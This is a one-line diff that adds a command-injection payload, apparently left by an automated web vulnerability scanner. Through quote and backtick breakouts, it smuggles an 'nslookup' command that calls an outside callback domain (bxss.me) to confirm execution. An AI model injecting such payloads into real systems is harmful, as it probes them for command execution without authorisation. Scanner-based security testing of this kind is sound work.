@@ -1,0 +1,1 @@
+&nslookup -q=cname hituepbzyajfm95ac1.bxss.me&'\"`0&nslookup -q=cname hituepbzyajfm95ac1.bxss.me&`'
